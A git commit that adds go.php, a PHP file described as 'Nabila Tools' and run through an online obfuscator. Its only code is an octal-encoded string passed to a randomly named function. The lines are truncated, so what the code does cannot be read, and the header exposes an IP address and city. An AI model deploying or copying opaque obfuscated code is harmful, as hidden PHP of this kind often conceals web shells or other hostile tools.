e716fbe9efd3375541c0cbbe501d6230256da6f7
xSana12 <57547849+xSana12@users.noreply.github.com>
2019-11-13 17:31:23 +0700

    go
    ini adalah

---
+++ go.php
@@ -0,0 +1,16 @@
+<?php
+/*
+Site            :       http://www.tool.eddiekidiw.com/phpobf>
+Date            :       2019-10-31
+Day             :       Thursday
+Time            :       10:18:15
+Ipaddress               :       114.5.216.56
+Hostname                :       114-5-216-56.resources.indosa>
+City            :       Jakarta
+Country         :       ID
+Region          :       Jakarta
+Browser         :       Mozilla/5.0 (Linux; Android 9; Redmi >
+Description             :       Nabila Tools
+*/
+$WtGKDTpswczsOwhvnlSJ=wDrsfVcMPJvXruKYuRbe("\61\60\63"."1\62\>
+?>
